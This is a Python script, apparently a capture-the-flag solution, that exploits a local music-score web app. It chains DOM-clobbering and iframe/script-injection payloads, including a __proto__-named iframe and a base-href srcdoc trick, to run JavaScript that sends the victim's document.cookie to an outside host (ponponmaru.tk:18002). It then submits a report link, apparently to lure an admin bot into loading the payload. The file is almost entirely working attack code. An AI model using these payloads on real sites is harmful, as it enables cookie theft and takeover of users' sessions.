import requests
import os

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "8505")

URL = f"http://{HOST}:{PORT}"

code = "location.href='http://ponponmaru.tk:18002/?x='+document.cookie;"

depth3 = '''
<base href='a://neko<iframe srcdoc="<script src=/api/score/{}></script>"></iframe>'>
<a id="value">
<a id="value" name="bpm" href="1">
<a id="value" name="displayWarp" href="1">
'''

depth2 = '''
<iframe name="__proto__" src="/api/score/{}"></iframe>
'''

depth1 = '''
<iframe name="synth_options" src="/api/score/{}"></iframe>
'''

r = requests.post(f'{URL}/',
                  data={"title": "code", "abc": code, "link": ""},
                  allow_redirects=False)
sid = r.headers['Location'][7:]
print(f"Code: {sid}")

r = requests.post(f'{URL}/',
                  data={"title": "d3", "abc": depth3.format(sid), "link": ""},
                  allow_redirects=False)
sid = r.headers['Location'][7:]
print(f"Depth 3: {sid}")

r = requests.post(f'{URL}/',
                  data={"title": "d2", "abc": depth2.format(sid), "link": ""},
                  allow_redirects=False)
sid = r.headers['Location'][7:]
print(f"Depth 2: {sid}")

r = requests.post(f'{URL}/',
                  data={"title": "d1", "abc": depth1.format(sid), "link": ""},
                  allow_redirects=False)
sid = r.headers['Location'][7:]
print(f"Depth 1: {sid}")

r = requests.post(f'{URL}/',
                  data={"title": "config",
                        "abc": "T: exploit",
                        "link": f"/api/score/{sid}"},
                  allow_redirects=False)
sid = r.headers['Location'][7:]
print(f"Report: /score/{sid}")

